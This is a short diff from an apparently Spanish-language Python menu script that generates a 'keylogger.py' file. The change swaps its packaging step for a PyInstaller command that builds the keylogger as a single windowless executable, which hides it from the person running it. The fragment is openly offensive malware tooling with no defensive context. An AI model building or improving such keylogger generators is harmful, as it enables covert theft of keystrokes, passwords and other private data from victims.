@@ -44,6 +44,6 @@ if __name__ == "__main__":
                 print("\033[1m\n[+] Se ha creado el archivo 'keylogger.py'\033[0m")
 
         if opcion == "2":
-            os.system("auto-py-to-exe")
+            os.system("pyinstaller --noconfirm --onefile --windowed keylogger.py")
 
 menu_principal()
